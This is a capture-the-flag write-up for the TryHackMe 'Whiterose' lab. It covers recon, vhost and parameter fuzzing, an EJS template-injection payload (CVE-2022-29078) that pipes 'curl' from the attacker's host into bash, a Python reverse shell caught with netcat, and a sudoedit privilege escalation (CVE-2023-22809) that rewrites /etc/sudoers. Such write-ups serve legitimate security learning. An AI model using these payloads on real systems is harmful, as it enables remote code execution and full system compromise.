---
layout: post
title: "Whiterose - THM writeup"
date: 2024-09-20 11:35:02.315480403 UTC
tags: CTF THM Whiterose Mr-Robot Hacking Challenge
---

Hi, Here is my writeup for [Whiterose](https://tryhackme.com/r/room/whiterose) Machine


## Recon

```console
# Nmap 7.95 scan initiated Sat Nov  2 18:35:59 2024 as: nmap -sT -sV -T4 -vv -oN cyprusbank.txt cyprusbank.thm
Nmap scan report for cyprusbank.thm (10.10.8.213)
Host is up, received syn-ack (0.31s latency).
Scanned at 2024-11-02 18:36:00 EET for 21s
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack nginx 1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Nov  2 18:36:21 2024 -- 1 IP address (1 host up) scanned in 21.84 seconds

```

Only two ports are open, `22` for SSH and `80` for HTTP

Navigating to the landing page,

## Main domain

Visiting the ip of the machine redirects us to `http://cyprusbank.thm` After adding it to `/etc/hosts`, it only shows a maintenance message..
```
10.10.158.201   cyprusbank.thm
```

![landing](/assets/img/CTF/THM/Whiterose/landing_page.png)

## VHost Enumeration

Already tried to do Content Discovery but nothing was found, so let's try to enumerate Virtual hosts

 <!-- > Virtual hosting is a method for hosting multiple domain names on a single server, which allows one server to share its resources, such as memory and processor cycles, without requiring all services provided to use the same host name.-->
<!--{: .prompt-tip}-->

```bash
ffuf -u "http://cyprusbank.thm/" -H "Host: FUZZ.cyprusbank.thm" -w ~/big.txt -fs 57 -t 100 -c
```

![vhosts](/assets/img/CTF/THM/Whiterose/vhosts.png)

We found `www.cyprusbank.thm` and `admin.cyprusbank.thm`

let's add them to `/etc/hosts`

```
 10.10.158.201   cyprusbank.thm admin.cyprusbank.thm www.cyprusbank.thm
```

### Admin domain
Navigating to `http://admin.cyprusbank.thm/` is going to redirect us to `/login`


![admin_landing](/assets/img/CTF/THM/Whiterose/Admin_landing.png)

> Use credentials Olivia Cortez:olivi8
{: .prompt-tip}


## Access as Gayle

After logging in as `Olivia` we can see the balance and transactions history, we can't view phone numbers

![Admin_panel](/assets/img/CTF/THM/Whiterose/AdminPanel.png)

We also can't navigate to `/settings`


![Denied_settings](/assets/img/CTF/THM/Whiterose/Denied_settings.png)

navigating to `/messages`

![messages](/assets/img/CTF/THM/Whiterose/messages.png)

Taking a closer look at the url

![chat_param](/assets/img/CTF/THM/Whiterose/chat_parameter.png)

well, let's change the value to anything and see what happens.. `http://admin.cyprusbank.thm/messages/?c=100`

![chatlogs](/assets/img/CTF/THM/Whiterose/chatlogs.png)

#### Tyrell's phone number
After logging out as `Olivia` and logging in as `Gayle`

Let's Search for Tyrell's phone number in `/search`

![tyrell](/assets/img/CTF/THM/Whiterose/Gayle_search.png)

## Shell as web

We can now navigate to `/settings`


![gayle_settings](/assets/img/CTF/THM/Whiterose/Gayle_settings.png)

It seems like this endpoints allows administrators to change the password of a customer's account.

### Parameter Fuzzing

I did try to test both `name`, `password` Parameters for `SSTI`,`SQLI`, and nothing was found, so let's fuzz for other parameteres.

```console
$ ffuf -u "http://admin.cyprusbank.thm/settings" -H "Content-Type: application/x-www-form-urlencoded" -H "Cookie: connect.sid=s%3ANRT7eaJhUczvOEquGMlSeV5xGkZfGWF0.ZVuGzZuSm9mE4VhBESv4yAGYv8YlxxZDcjansMPXMZk" -X POST -d "name=test&password=pwned&FUZZ=test" -mc all -w ~/burp-parameter-names.txt -fs 2099

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
------
client                  [Status: 500, Size: 1399, Words: 80, Lines: 11, Duration: 319ms]
delimiter               [Status: 200, Size: 1445, Words: 327, Lines: 35, Duration: 317ms]
error                   [Status: 200, Size: 1468, Words: 281, Lines: 49, Duration: 315ms]
include                 [Status: 500, Size: 1388, Words: 80, Lines: 11, Duration: 320ms]
message                 [Status: 200, Size: 2160, Words: 444, Lines: 61, Duration: 407ms]
password                [Status: 200, Size: 2104, Words: 427, Lines: 59, Duration: 415ms]
strict                  [Status: 500, Size: 2301, Words: 161, Lines: 11, Duration: 320ms]
:: Progress: [6453/6453] :: Job [1/1] :: 127 req/sec :: Duration: [0:00:54] :: Errors: 0 ::

```

We found these parameteres: `client, delimiter, error, include, message, password, strict`

I started testing the `client` and `include` parameters first and that caused interesting errors

![client_test](/assets/img/CTF/THM/Whiterose/client_test.png)

```console
TypeError: /home/web/app/views/settings.ejs:4
    2| <html lang="en">
    3|   <head>
 >> 4|     <%- include("../components/head"); %>
    5|     <title>Cyprus National Bank</title>
    6|   </head>
    7|   <body>

include is not a function
    at settings ("/home/web/app/views/settings.ejs":53:17)
    at tryHandleCache (/home/web/app/node_modules/ejs/lib/ejs.js:272:36)
    at View.exports.renderFile [as engine] (/home/web/app/node_modules/ejs/lib/ejs.js:489:10)
    at View.render (/home/web/app/node_modules/express/lib/view.js:135:8)
    at tryRender (/home/web/app/node_modules/express/lib/application.js:657:10)
    at Function.render (/home/web/app/node_modules/express/lib/application.js:609:3)
    at ServerResponse.render (/home/web/app/node_modules/express/lib/response.js:1039:7)
    at /home/web/app/routes/settings.js:27:7
    at runMicrotasks (<anonymous>)
    at processTicksAndRejections (node:internal/process/task_queues:96:5)
```

However I notice the ejs file extension, after searching it I found that it is an Embedded JavaScript templating language, which reminds me of SSTI.

![missing](https://y.yarn.co/6c667cef-2b9f-4a04-b94d-fdad872ceb90_text.gif)

### Server Side Template Injection (SSTI)

>SSTI occurs when user input is improperly sanitized and directly evaluated in a server-side template. This allows attackers to inject and execute malicious template code, potentially gaining access to sensitive data or executing arbitrary code on the server.
{: .highlight}


#### CVE-2022-29078
After researching about `ejs vulnerbilities`, I came across this [Awesome Blog](https://eslam.io/posts/ejs-server-side-template-injection-rce/) about `CVE-2022-29078`, I suggest reading that before you continue

Here is the payload we can use to exploit this CVE

```console

&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('curl http://10.17.14.227:8081 | bash');s

```

This command retrieves and executes the payload hosted on our server `curl http://10.17.14.227:8081 | bash`

create index.html and launch python server

```console
$ cat index.html
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.17.14.227",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'

$ python3 -m http.server 8081
```

launch listener on port `1337`
```console
nc -nlvp 1337
```

![SSTI](/assets/img/CTF/THM/Whiterose/SSTI_burp.png)

![revshell](/assets/img/CTF/THM/Whiterose/revshell.png)

#### User flag
```console
$ cat /home/web/user.txt

```
![userflag](/assets/img/CTF/THM/Whiterose/userflag.png)

## Shell as root

#### CVE-2023-22809

Checking sudo privileges for `web` user, we see that `web` can only run `sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm` as root without password, also note that version of sudo is vulnerable to `CVE-2023-22809`

![sudolv](/assets/img/CTF/THM/Whiterose/sudolv.png)

Sudoedit allows users to choose their editor by setting environment variables like `EDITOR` or `SUDO_EDITOR`, the values of these variables can also have arguments to these editors, sudo seperates the editor and it's argument(s) using `--`,

This means that we can use `--` to add other files to edit!, there is many we could write to, but most importantly the sudoers file.

```console
web@cyprusbank:~$ export EDITOR="vim -- /etc/sudoers"
web@cyprusbank:~$ sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```

Add this line to `/etc/sudoers` file so we can run anything as root with no password, save and quit

```
web ALL=(ALL) NOPASSWD: ALL
```

![privesc](/assets/img/CTF/THM/Whiterose/privesc.png)

Then just do `sudo bash`, and finally we get the root flag

![rootflag](/assets/img/CTF/THM/Whiterose/r00tflag.png)
